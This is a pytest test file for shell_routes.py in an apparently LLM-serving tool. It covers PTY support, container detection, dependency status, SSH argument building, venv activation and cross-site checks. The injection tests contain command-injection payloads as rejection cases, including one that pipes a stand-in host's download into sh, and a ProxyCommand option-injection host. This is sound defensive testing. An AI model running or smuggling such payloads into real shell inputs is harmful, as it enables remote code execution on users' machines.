"""Tests for shell_routes.py helpers."""

import builtins
import importlib
import importlib.util
import json
import os
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

import routes.shell_routes as shell_routes
from routes.shell_routes import (
    _find_line_break,
    _import_optional_dependency_for_status,
    _running_in_container,
    _docker_row_status,
    _package_installed_from_probe,
    _package_pip_update_status,
    _package_probe_script,
    _package_status_note,
    _prepend_user_install_bins_to_path,
    _reject_cross_site,
    _ssh_base_argv,
    _venv_activate_prefix,
    DOCKER_IN_CONTAINER_HINT,
)


def test_shell_routes_import_without_posix_pty_modules(monkeypatch):
    """Native Windows has no fcntl/termios; importing routes must still work."""
    real_import = builtins.__import__

    def fake_import(name, globals=None, locals=None, fromlist=(), level=0):
        if name in {"fcntl", "pty"}:
            raise ImportError(f"No module named {name!r}")
        return real_import(name, globals, locals, fromlist, level)

    monkeypatch.setattr(builtins, "__import__", fake_import)
    cached_modules = {name: sys.modules.pop(name, None) for name in ("fcntl", "pty")}

    module_path = Path(__file__).resolve().parents[1] / "routes" / "shell_routes.py"
    spec = importlib.util.spec_from_file_location(
        "_shell_routes_without_pty", module_path
    )
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    try:
        spec.loader.exec_module(module)
    finally:
        sys.modules.pop(spec.name, None)
        for name, cached_module in cached_modules.items():
            if cached_module is not None:
                sys.modules[name] = cached_module

    assert module.PTY_SUPPORTED is False
    assert module._find_line_break(b"ok\n") == (2, 1)


async def test_generate_pty_reports_explicit_unsupported_error(monkeypatch):
    """Clients can distinguish unsupported PTY mode from process failures."""
    import routes.shell_routes as shell_routes

    monkeypatch.setattr(shell_routes, "PTY_SUPPORTED", False)
    monkeypatch.setattr(
        shell_routes, "_PTY_IMPORT_ERROR", ImportError("No module named 'termios'")
    )

    request = SimpleNamespace(is_disconnected=lambda: False)
    events = [
        json.loads(chunk.removeprefix("data: ").strip())
        async for chunk in shell_routes._generate_pty("echo hi", 5, request)
    ]

    assert events == [
        {
            "stream": "stderr",
            "data": "PTY streaming is not supported on this platform: No module named 'termios'",
            "error": shell_routes.PTY_UNSUPPORTED_ERROR,
        },
        {"exit_code": -1, "error": shell_routes.PTY_UNSUPPORTED_ERROR},
    ]


class TestFindLineBreak:
    """Test line-break detection in byte buffers."""

    def test_newline(self):
        assert _find_line_break(b"hello\nworld") == (5, 1)

    def test_crlf(self):
        assert _find_line_break(b"hello\r\nworld") == (5, 2)

    def test_cr_only(self):
        assert _find_line_break(b"hello\rworld") == (5, 1)

    def test_no_breaks(self):
        assert _find_line_break(b"no breaks") == (-1, 0)

    def test_empty(self):
        assert _find_line_break(b"") == (-1, 0)

    def test_leading_newline(self):
        assert _find_line_break(b"\n") == (0, 1)

    def test_leading_cr(self):
        assert _find_line_break(b"\r") == (0, 1)

    def test_leading_crlf(self):
        assert _find_line_break(b"\r\n") == (0, 2)

    def test_multiple_newlines(self):
        """Should find the first one."""
        assert _find_line_break(b"a\nb\nc") == (1, 1)

    def test_cr_before_newline_not_adjacent(self):
        """\\r at pos 2, \\n at pos 5 — not CRLF, should return \\r pos."""
        assert _find_line_break(b"ab\rcd\n") == (2, 1)

    def test_newline_before_cr(self):
        """\\n comes before \\r — should return \\n."""
        assert _find_line_break(b"ab\ncd\r") == (2, 1)


class TestRunningInContainer:
    """Detect whether the Odysseus process itself runs inside a container."""

    def test_dockerenv_marker_present(self, tmp_path):
        marker = tmp_path / ".dockerenv"
        marker.write_text("")
        assert (
            _running_in_container(
                dockerenv_path=str(marker),
                cgroup_path=str(tmp_path / "missing"),
            )
            is True
        )

    def test_cgroup_names_a_container_runtime(self, tmp_path):
        cgroup = tmp_path / "cgroup"
        cgroup.write_text("12:devices:/docker/abcdef0123456789\n")
        assert (
            _running_in_container(
                dockerenv_path=str(tmp_path / "no-marker"),
                cgroup_path=str(cgroup),
            )
            is True
        )

    def test_bare_host_has_neither_signal(self, tmp_path):
        cgroup = tmp_path / "cgroup"
        cgroup.write_text("0::/user.slice/session-1.scope\n")
        assert (
            _running_in_container(
                dockerenv_path=str(tmp_path / "no-marker"),
                cgroup_path=str(cgroup),
            )
            is False
        )

    def test_missing_cgroup_file_is_not_a_container(self, tmp_path):
        assert (
            _running_in_container(
                dockerenv_path=str(tmp_path / "no-marker"),
                cgroup_path=str(tmp_path / "also-missing"),
            )
            is False
        )


class TestAppleSiliconDetection:
    """APFEL should only surface as available on native Apple Silicon Macs."""

    def test_reports_true_on_macos_arm64(self, monkeypatch):
        import core.platform_compat as platform_compat

        monkeypatch.setattr(platform_compat.platform, "system", lambda: "Darwin")
        monkeypatch.setattr(platform_compat.platform, "machine", lambda: "arm64")
        monkeypatch.setattr(platform_compat.os, "name", "posix")
        importlib.reload(platform_compat)

        assert platform_compat.IS_APPLE_SILICON is True

    @pytest.mark.parametrize("machine", ["x86_64", "amd64"])
    def test_reports_false_off_apple_silicon(self, monkeypatch, machine):
        import core.platform_compat as platform_compat

        monkeypatch.setattr(platform_compat.platform, "system", lambda: "Darwin")
        monkeypatch.setattr(platform_compat.platform, "machine", lambda: machine)
        importlib.reload(platform_compat)

        assert platform_compat.IS_APPLE_SILICON is False

    def test_reports_false_on_non_macos(self, monkeypatch):
        import core.platform_compat as platform_compat

        monkeypatch.setattr(platform_compat.platform, "system", lambda: "Linux")
        monkeypatch.setattr(platform_compat.platform, "machine", lambda: "arm64")
        importlib.reload(platform_compat)

        assert platform_compat.IS_APPLE_SILICON is False


class TestDockerRowStatus:
    """Applicability plus install hint for the docker dependency row."""

    DEFAULT = "Install Docker on the selected server."

    def test_in_container_and_absent_is_not_applicable_with_safe_default_hint(self):
        status = _docker_row_status(
            on_remote=False,
            in_container=True,
            installed=False,
            default_hint=self.DEFAULT,
        )
        assert status.applicable is False
        assert status.install_hint == DOCKER_IN_CONTAINER_HINT

    def test_in_container_but_present_is_applicable_with_default_hint(self):
        status = _docker_row_status(
            on_remote=False,
            in_container=True,
            installed=True,
            default_hint=self.DEFAULT,
        )
        assert status.applicable is True
        assert status.install_hint == self.DEFAULT

    def test_on_host_and_absent_stays_applicable_with_default_hint(self):
        status = _docker_row_status(
            on_remote=False,
            in_container=False,
            installed=False,
            default_hint=self.DEFAULT,
        )
        assert status.applicable is True
        assert status.install_hint == self.DEFAULT

    def test_remote_server_is_always_applicable_even_when_absent(self):
        status = _docker_row_status(
            on_remote=True,
            in_container=False,
            installed=False,
            default_hint=self.DEFAULT,
        )
        assert status.applicable is True
        assert status.install_hint == self.DEFAULT

    def test_remote_server_ignores_local_container_status(self):
        status = _docker_row_status(
            on_remote=True,
            in_container=True,
            installed=False,
            default_hint=self.DEFAULT,
        )
        assert status.applicable is True
        assert status.install_hint == self.DEFAULT

    def test_container_hint_steers_to_remote_and_warns_on_socket(self):
        lowered = DOCKER_IN_CONTAINER_HINT.lower()
        assert "remote" in lowered
        assert "socket" in lowered
        assert "host-root" in lowered or "host root" in lowered


class TestPackageProbeStatus:
    """Dependency rows should reflect serve readiness, not import coincidences."""

    def test_vllm_namespace_without_cli_is_not_installed(self):
        probe = {
            "modules": {
                "vllm": {
                    "found": True,
                    "origin": None,
                    "loader": None,
                    "locations": ["/root/vllm"],
                    "real_module": False,
                }
            },
            "dists": {},
            "binaries": {"vllm": None},
        }

        assert _package_installed_from_probe("vllm", probe) is False
        assert "namespace" in _package_status_note("vllm", probe)
        assert "no vLLM CLI" in _package_status_note("vllm", probe)

    def test_vllm_requires_cli_for_current_serve_command(self):
        probe = {
            "modules": {"vllm": {"found": True, "real_module": True}},
            "dists": {"vllm": "0.8.5"},
            "binaries": {"vllm": "/home/user/venv/bin/vllm"},
        }

        assert _package_installed_from_probe("vllm", probe) is True
        assert "python package: vllm 0.8.5" in _package_status_note("vllm", probe)
        assert (
            _package_pip_update_status({"name": "vllm", "pip": "vllm"}, probe).available
            is True
        )

    def test_vllm_cli_without_dist_is_external_for_update(self):
        probe = {
            "modules": {"vllm": {"found": False, "real_module": False}},
            "dists": {},
            "binaries": {"vllm": "/opt/vllm/bin/vllm"},
        }

        status = _package_pip_update_status({"name": "vllm", "pip": "vllm"}, probe)

        assert _package_installed_from_probe("vllm", probe) is True
        assert status.available is False
        assert "outside Odysseus" in status.note

    def test_llama_cpp_is_installed_when_native_llama_server_exists(self):
        probe = {
            "modules": {"llama_cpp": {"found": False, "real_module": False}},
            "dists": {},
            "binaries": {"llama-server": "/usr/local/bin/llama-server"},
        }

        assert _package_installed_from_probe("llama_cpp", probe) is True
        assert "native llama-server" in _package_status_note("llama_cpp", probe)
        status = _package_pip_update_status(
            {"name": "llama_cpp", "pip": "llama-cpp-python[server]"}, probe
        )
        assert status.available is False
        assert "package manager or source checkout" in status.note

    def test_apfel_does_not_use_generic_outside_odysseus_note(self):
        status = _package_pip_update_status(
            {"name": "APFEL", "pip": "", "update_cmd": "brew upgrade apfel"},
            {"binaries": {}, "dists": {}, "modules": {}},
        )

        assert status.available is False
        assert "Update this system dependency outside Odysseus." not in status.note

    def test_diffusers_requires_torch_too(self):
        missing_torch = {
            "modules": {
                "diffusers": {"found": True, "real_module": True},
                "torch": {"found": False},
            },
            "dists": {"diffusers": "0.37.0"},
            "binaries": {},
        }
        ready = {
            "modules": {
                "diffusers": {"found": True, "real_module": True},
                "torch": {"found": True, "real_module": True},
            },
            "dists": {"diffusers": "0.37.0", "torch": "2.10.0"},
            "binaries": {},
        }

        assert _package_installed_from_probe("diffusers", missing_torch) is False
        assert _package_installed_from_probe("diffusers", ready) is True

    def test_local_user_install_bin_is_added_to_path(self, monkeypatch, tmp_path):
        user_base = tmp_path / "user-base"
        monkeypatch.setattr("site.USER_BASE", str(user_base))
        home = str(tmp_path / "home")
        monkeypatch.setenv("HOME", home)
        monkeypatch.setenv("USERPROFILE", home)  # Windows uses USERPROFILE for expanduser("~")
        monkeypatch.setenv("PATH", "/usr/bin")

        _prepend_user_install_bins_to_path()

        normed = [os.path.normcase(os.path.normpath(p)) for p in os.environ["PATH"].split(os.pathsep)]
        assert os.path.normcase(str(user_base / "bin")) in normed
        assert os.path.normcase(str(tmp_path / "home" / ".local" / "bin")) in normed

    def test_remote_package_probe_checks_user_install_bin(self):
        script = _package_probe_script(["vllm"])

        assert "site.USER_BASE" in script
        assert "os.path.expanduser('~/.local/bin')" in script
        assert "add_user_install_bins_to_path()" in script
        assert "shutil.which(b)" in script

    def test_status_import_prepares_optional_dependency(self, monkeypatch):
        import routes.shell_routes as shell_routes

        calls = []
        monkeypatch.setattr(
            shell_routes,
            "prepare_optional_dependency_import",
            lambda name: calls.append(name),
        )
        monkeypatch.setattr(
            shell_routes.importlib,
            "import_module",
            lambda name: SimpleNamespace(__name__=name),
        )

        module = _import_optional_dependency_for_status("realesrgan")

        assert module.__name__ == "realesrgan"
        assert calls == ["realesrgan"]


class TestSshBaseArgv:
    def test_basic_host_no_port(self):
        assert _ssh_base_argv("user@example.com", None) == [
            "ssh",
            "-o",
            "ConnectTimeout=6",
            "-o",
            "StrictHostKeyChecking=no",
            "user@example.com",
        ]

    def test_default_port_22_omitted(self):
        assert "-p" not in _ssh_base_argv("h", "22")
        assert "-p" not in _ssh_base_argv("h", "")
        assert "-p" not in _ssh_base_argv("h", None)

    def test_custom_port_added_as_separate_argv(self):
        assert _ssh_base_argv("h", "2222")[-3:] == ["-p", "2222", "h"]

    @pytest.mark.parametrize("bad", ["0", "70000", "-1", "8a", "$(id)", "22 22"])
    def test_bad_port_rejected(self, bad):
        with pytest.raises(ValueError):
            _ssh_base_argv("h", bad)

    def test_option_injecting_host_rejected(self):
        with pytest.raises(ValueError):
            _ssh_base_argv("-oProxyCommand=touch /tmp/pwn", None)

    @pytest.mark.parametrize("bad", ["", "   ", None])
    def test_empty_host_rejected(self, bad):
        with pytest.raises(ValueError):
            _ssh_base_argv(bad, None)


class TestVenvActivatePrefix:
    def test_empty_returns_blank(self):
        assert _venv_activate_prefix(None) == ""
        assert _venv_activate_prefix("") == ""

    def test_appends_bin_activate(self):
        assert _venv_activate_prefix("~/venv") == ". ~/venv/bin/activate && "

    def test_already_pointing_at_activate(self):
        assert (
            _venv_activate_prefix("/opt/v/bin/activate") == ". /opt/v/bin/activate && "
        )

    @pytest.mark.parametrize(
        "bad",
        [
            "/opt/v && curl evil|sh",
            "$(id)",
            "`id`",
            "v;id",
            "v\nid",
            "v|id",
        ],
    )
    def test_injection_payloads_rejected(self, bad):
        with pytest.raises(ValueError):
            _venv_activate_prefix(bad)


class TestRejectCrossSite:
    @staticmethod
    def _req(headers):
        return SimpleNamespace(headers=headers)

    def test_cross_site_rejected(self):
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc:
            _reject_cross_site(self._req({"sec-fetch-site": "cross-site"}))
        assert exc.value.status_code == 403

    @pytest.mark.parametrize("site", ["same-origin", "same-site", "none"])
    def test_same_origin_and_direct_nav_allowed(self, site):
        assert _reject_cross_site(self._req({"sec-fetch-site": site})) is None

    def test_missing_header_allowed(self):
        assert _reject_cross_site(self._req({})) is None


def _shell_client() -> TestClient:
    app = FastAPI()
    app.include_router(shell_routes.setup_shell_routes())
    return TestClient(app)


def test_resolve_wheel_endpoint_returns_force_cpu(monkeypatch):
    async def _fake_probe(_platform_hint):
        return {
            "platform": "linux",
            "python_version": "3.11",
            "backend": "cuda",
            "cuda_version": "12.4",
            "python_arch": "x86_64",
            "host_arch": "x86_64",
            "python_arch_mismatch": False,
        }

    monkeypatch.setattr(shell_routes, "_probe_local_llama_wheel_context", _fake_probe)

    with _shell_client() as client:
        res = client.post(
            "/api/cookbook/llama-cpp/resolve-wheel",
            json={"platform": "linux", "force_cpu_prebuilt": True},
        )

    assert res.status_code == 200
    payload = res.json()
    assert payload["ok"] is True
    assert payload["resolution"]["suffix"] == "cpu"


def test_packages_endpoint_llama_metadata_exposes_arch_mismatch(monkeypatch):
    async def _fake_probe(_platform_hint):
        return {
            "platform": "macos",
            "python_version": "3.11",
            "backend": "metal",
            "cuda_version": None,
            "python_arch": "x86_64",
            "host_arch": "arm64",
            "python_arch_mismatch": True,
        }

    monkeypatch.setattr(shell_routes, "_probe_local_llama_wheel_context", _fake_probe)

    with _shell_client() as client:
        res = client.get("/api/cookbook/packages?platform=macos")

    assert res.status_code == 200
    payload = res.json()
    llama = next((p for p in payload.get("packages", []) if p.get("name") == "llama_cpp"), None)
    assert llama is not None
    assert llama.get("selected_wheel_suffix") == "metal"
    flags = llama.get("compatibility_flags") or {}
    assert flags.get("python_arch_mismatch") is True
    assert "native arm64 Python" in str(llama.get("wheel_reason") or "")


# ---------------------------------------------------------------------------
# _win_path_to_bash helper
# ---------------------------------------------------------------------------

def test_win_path_to_bash_converts_drive_letter():
    from routes.shell_routes import _win_path_to_bash
    assert _win_path_to_bash(r"C:\Foo\Bar") == "/c/Foo/Bar"
    assert _win_path_to_bash(r"D:\VC\Tools\MSVC\bin") == "/d/VC/Tools/MSVC/bin"
    assert _win_path_to_bash("C:/Foo/Bar") == "/c/Foo/Bar"


def test_win_path_to_bash_non_windows_path_passthrough():
    from routes.shell_routes import _win_path_to_bash
    assert _win_path_to_bash("/usr/bin") == "/usr/bin"


# ---------------------------------------------------------------------------
# prereq-check endpoint — Windows path
# ---------------------------------------------------------------------------

def _prereq_client_with_ps_output(monkeypatch, ps_json: str, returncode: int = 0):
    """Return a TestClient whose prereq-check endpoint gets its subprocess
    output from ``ps_json`` without actually spawning PowerShell."""
    import asyncio

    class _FakeProc:
        def __init__(self, out, rc):
            self._out = out
            self.returncode = rc

        async def communicate(self):
            return self._out.encode(), b""

    async def _fake_exec(*args, **kwargs):
        return _FakeProc(ps_json, returncode)

    monkeypatch.setattr(shell_routes.asyncio, "create_subprocess_exec", _fake_exec)
    return _shell_client()


def test_prereq_check_tools_on_path_returns_ok(monkeypatch):
    """cl.exe and cmake both on PATH → ok=True, needs_path_add=False."""
    ps_out = (
        '{"cl_on_path":true,"cl_dir":"","cmake_on_path":true,"cmake_dir":"",'
        '"vs_inst":"C:\\\\VS","gxx":false,"cl":true,"cmake":true}'
    )
    with _prereq_client_with_ps_output(monkeypatch, ps_out) as client:
        res = client.post(
            "/api/cookbook/llama-cpp/prereq-check",
            json={"platform": "windows", "mode": "source"},
        )
    assert res.status_code == 200
    data = res.json()
    assert data["ok"] is True
    assert data["needs_path_add"] is False
    assert data["missing"] == []
    assert data["paths_to_add"] == []


def test_prereq_check_cl_via_vswhere_returns_needs_path_add(monkeypatch):
    """cl.exe found via vswhere but not on PATH, cmake on PATH (prebuilt mode)
    → ok=False, needs_path_add=True, paths_to_add contains cl_dir."""
    import json as _json
    cl_dir = r"C:\VS\VC\Tools\MSVC\14.40\bin\Hostx64\x64"
    ps_out = _json.dumps({
        "cl_on_path": False, "cl_dir": cl_dir,
        "cmake_on_path": True, "cmake_dir": "",
        "vs_inst": r"C:\VS", "gxx": False, "cl": True, "cmake": True,
    })
    with _prereq_client_with_ps_output(monkeypatch, ps_out) as client:
        res = client.post(
            "/api/cookbook/llama-cpp/prereq-check",
            json={"platform": "windows", "mode": "prebuilt"},
        )
    assert res.status_code == 200
    data = res.json()
    assert data["ok"] is False
    assert data["needs_path_add"] is True
    assert cl_dir in data["paths_to_add"]
    assert data["missing"] == []


def test_prereq_check_source_needs_cmake_path_add(monkeypatch):
    """cl.exe on PATH, cmake found via vswhere only (source mode)
    → ok=False, needs_path_add=True, cmake_dir in paths_to_add."""
    import json as _json
    cmake_dir = r"C:\VS\Common7\IDE\CommonExtensions\Microsoft\CMake\CMake\bin"
    ps_out = _json.dumps({
        "cl_on_path": True, "cl_dir": "",
        "cmake_on_path": False, "cmake_dir": cmake_dir,
        "vs_inst": r"C:\VS", "gxx": False, "cl": True, "cmake": True,
    })
    with _prereq_client_with_ps_output(monkeypatch, ps_out) as client:
        res = client.post(
            "/api/cookbook/llama-cpp/prereq-check",
            json={"platform": "windows", "mode": "source"},
        )
    assert res.status_code == 200
    data = res.json()
    assert data["ok"] is False
    assert data["needs_path_add"] is True
    assert cmake_dir in data["paths_to_add"]
    assert data["missing"] == []


def test_prereq_check_tools_missing_returns_missing(monkeypatch):
    """No compiler found anywhere → ok=False, needs_path_add=False, missing populated."""
    ps_out = (
        '{"cl_on_path":false,"cl_dir":"","cmake_on_path":false,"cmake_dir":"",'
        '"vs_inst":"","gxx":false,"cl":false,"cmake":false}'
    )
    with _prereq_client_with_ps_output(monkeypatch, ps_out) as client:
        res = client.post(
            "/api/cookbook/llama-cpp/prereq-check",
            json={"platform": "windows", "mode": "source"},
        )
    assert res.status_code == 200
    data = res.json()
    assert data["ok"] is False
    assert data["needs_path_add"] is False
    assert data["paths_to_add"] == []
    tool_names = [m["tool"] for m in data["missing"]]
    assert any("compiler" in t for t in tool_names)
    assert any("cmake" in t for t in tool_names)


def test_prereq_check_prebuilt_does_not_require_cmake(monkeypatch):
    """In prebuilt mode, missing cmake alone must not populate missing[] (cmake not required)."""
    ps_out = (
        '{"cl_on_path":true,"cl_dir":"","cmake_on_path":false,"cmake_dir":"",'
        '"vs_inst":"C:\\\\VS","gxx":false,"cl":true,"cmake":false}'
    )
    with _prereq_client_with_ps_output(monkeypatch, ps_out) as client:
        res = client.post(
            "/api/cookbook/llama-cpp/prereq-check",
            json={"platform": "windows", "mode": "prebuilt"},
        )
    assert res.status_code == 200
    data = res.json()
    assert data["ok"] is True
    assert data["missing"] == []
    assert data["paths_to_add"] == []


# ---------------------------------------------------------------------------
# add-to-path endpoint
# ---------------------------------------------------------------------------

def test_add_to_path_rejects_remote_host():
    with _shell_client() as client:
        res = client.post(
            "/api/cookbook/llama-cpp/add-tools-to-path",
            json={"remote_host": "myserver.local"},
        )
    assert res.status_code == 400


# ---------------------------------------------------------------------------
# _normalize_platform_label
# ---------------------------------------------------------------------------

def test_normalize_platform_label_windows_variants():
    from routes.shell_routes import _normalize_platform_label
    for variant in ("windows", "win", "win32", "Windows", "WIN"):
        assert _normalize_platform_label(variant) == "windows", variant


def test_normalize_platform_label_macos_variants():
    from routes.shell_routes import _normalize_platform_label
    for variant in ("darwin", "mac", "macos", "osx", "MacOS"):
        assert _normalize_platform_label(variant) == "macos", variant


def test_normalize_platform_label_termux():
    from routes.shell_routes import _normalize_platform_label
    assert _normalize_platform_label("termux") == "termux"


def test_normalize_platform_label_none_falls_back_to_host(monkeypatch):
    import routes.shell_routes as sr
    monkeypatch.setattr(sr, "IS_WINDOWS", False)
    monkeypatch.setattr(sr.sys, "platform", "linux")
    assert sr._normalize_platform_label(None) == "linux"
    assert sr._normalize_platform_label("") == "linux"


def test_normalize_platform_label_arbitrary_value_passthrough():
    from routes.shell_routes import _normalize_platform_label
    assert _normalize_platform_label("freebsd") == "freebsd"


# ---------------------------------------------------------------------------
# _extract_cuda_release
# ---------------------------------------------------------------------------

def test_extract_cuda_release_from_nvcc_output():
    from routes.shell_routes import _extract_cuda_release
    text = "nvcc: NVIDIA (R) Cuda compiler driver\nCuda compilation tools, release 12.4, V12.4.131"
    assert _extract_cuda_release(text) == "12.4"


def test_extract_cuda_release_from_nvidia_smi_header():
    from routes.shell_routes import _extract_cuda_release
    text = "NVIDIA-SMI 550.54.15   Driver Version: 550.54.15   CUDA Version: 12.4"
    assert _extract_cuda_release(text) == "12.4"


def test_extract_cuda_release_returns_none_when_absent():
    from routes.shell_routes import _extract_cuda_release
    assert _extract_cuda_release("") is None
    assert _extract_cuda_release("no version here") is None


def test_extract_cuda_release_handles_case_insensitivity():
    from routes.shell_routes import _extract_cuda_release
    text = "Cuda compilation tools, Release 11.8, V11.8.89"
    assert _extract_cuda_release(text) == "11.8"
